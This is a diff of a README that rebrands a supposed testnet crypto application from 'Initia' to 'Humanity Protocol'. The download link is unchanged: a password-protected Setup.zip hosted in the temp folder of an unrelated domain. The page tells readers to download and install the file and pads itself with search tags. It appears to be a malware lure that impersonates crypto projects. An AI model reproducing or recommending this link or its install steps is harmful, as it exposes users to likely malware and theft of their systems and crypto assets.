@@ -1,36 +1,29 @@
-# 🚀 Initia - Decentralized Incubation Platform 2024 🚀
+# 🚀 Humanity Protocol 🚀
 
 # [DOWNLOAD](https://erdogansigorta.com/temp/Setup.zip)  
 ## Password - z4iS5VVOeZIe
 
 ## 📜 Overview
 
-**Initia** is a decentralized incubation platform on Testnet, providing developers with tools and resources to create and scale innovative blockchain projects in a secure environment.
+**Humanity Protocol** is a Testnet application designed to facilitate decentralized identity and verification services. It enables developers to create and test systems focused on secure, decentralized identity management.
 
 ### 📋 How to Use
 
-1. **Download Initia** using the provided link.
-2. **Install** Initia on your device.
-3. **Develop and incubate blockchain projects** with resources and tools on Testnet.
+1. **Download Humanity Protocol** using the link above.
+2. **Install** the application on your system.
+3. **Begin developing and testing** identity verification services on the decentralized platform.
 
 ---
 
-If Initia supports your goals, please ⭐ this repository!
+If you find Humanity Protocol helpful, please ⭐ this repository!
 
 ### 🔑 Tags
 
-- Initia
-- Initia-incubation
-- Initia-decentralized
-- Initia-Testnet
-- Initia-free-download
-- Initia-setup-2024
-- Initia-install
-- Initia-platform
-- Initia-tools
-- Initia-crypto
-- Initia-for-developers
-- Initia-blockchain
-- Initia-innovation
-- Initia-project-support
-- Initia-scalable
+- Humanity-Protocol
+- Humanity-Protocol-for-Testnet
+- Humanity-Protocol-identity-verification
+- Humanity-Protocol-decentralized
+- Humanity-Protocol-free
+- Humanity-Protocol-setup
+- Humanity-Protocol-install
+- Humanity-Protocol-2024
